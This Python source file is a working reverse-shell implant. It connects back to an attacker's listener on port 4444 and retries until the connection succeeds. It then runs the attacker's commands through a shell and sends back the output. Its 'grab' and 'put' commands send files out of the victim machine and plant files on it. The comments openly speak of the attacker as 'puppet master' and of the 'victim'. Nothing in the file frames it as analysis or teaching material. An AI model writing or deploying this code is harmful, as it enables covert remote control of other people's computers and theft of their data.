import socket
import os
import subprocess
import sys
import time

# Set your attacker IP and port
HOST = '127.0.0.1'  # This is still you, the puppet master
PORT = 4444

def upload_file(s, filename):
    """Pulls a file from the attacker's machine (PUT command on attacker side)"""
    try:
        # The script tells the server it's ready to receive
        s.send(b"[FILE_READY_TO_RECEIVE]\n")
        # Attacker's listener sends file size first (4 bytes)
        file_size_bytes = s.recv(4)
        if not file_size_bytes:
            s.send(b"Error: Did not receive file size.\n")
            return
            
        file_size = int.from_bytes(file_size_bytes, 'big')

        if file_size == 0:
            s.send(b"Error: File size is 0 or file doesn't exist on attacker side.\n")
            return

        with open(filename, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                data = s.recv(1024)
                if not data:
                    break
                f.write(data)
                bytes_received += len(data)

        s.send(f"Success: File '{filename}' uploaded ({bytes_received} bytes).\n".encode('utf-8'))
    except Exception as e:
        s.send(f"Error during file upload: {e}\n".encode('utf-8'))

def download_file(s, filename):
    """Pushes a file to the attacker's machine (GET command on attacker side)"""
    try:
        if not os.path.exists(filename):
            s.send(f"Error: File '{filename}' not found on victim system.\n".encode('utf-8'))
            return
            
        file_size = os.path.getsize(filename)
        
        # Send a success message, file size, and then the file data
        s.send(f"[FILE_BEGIN_SENDING]".encode('utf-8'))
        time.sleep(0.1) # Wait for the buffer to clear

        # Send file size (4 bytes)
        s.send(file_size.to_bytes(4, 'big'))

        with open(filename, 'rb') as f:
            l = f.read(1024)
            while (l):
                s.send(l)
                l = f.read(1024)
        
        # Send a completion message (optional, but good practice)
        s.send(f"[FILE_TRANSFER_COMPLETE]".encode('utf-8'))
        s.send(f"Success: File '{filename}' downloaded ({file_size} bytes).\n".encode('utf-8'))
    except Exception as e:
        s.send(f"Error during file download: {e}\n".encode('utf-8'))

# Connection loop (same as before)
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.send(b'WSP? Omega is connecting with file transfer ready...\n')
        break
    except Exception as e:
        time.sleep(5)
        continue

# Command loop (UPDATED)
while True:
    try:
        data = s.recv(1024).decode('utf-8').strip()
        
        if data.lower() == 'quit' or data.lower() == 'exit':
            break

        # --- NEW FILE TRANSFER LOGIC ---
        elif data.lower().startswith('grab '): 
            # Attacker command: grab file.txt (meaning victim downloads it to attacker)
            filename = data[5:].strip()
            download_file(s, filename)

        elif data.lower().startswith('put '):
            # Attacker command: put new_file.txt (meaning victim uploads it from attacker)
            filename = data[4:].strip()
            upload_file(s, filename)
        # -------------------------------
            
        elif data.lower().startswith('cd '):
            # Change directory command (same as before)
            path = data[3:].strip()
            os.chdir(path)
            s.send(f"Changed dir to {os.getcwd()}\n".encode('utf-8'))
        else:
            # Execute command (same as before)
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value + b'\n')

    except Exception as e:
        s.close()
        break
        
s.close()
sys.exit(0)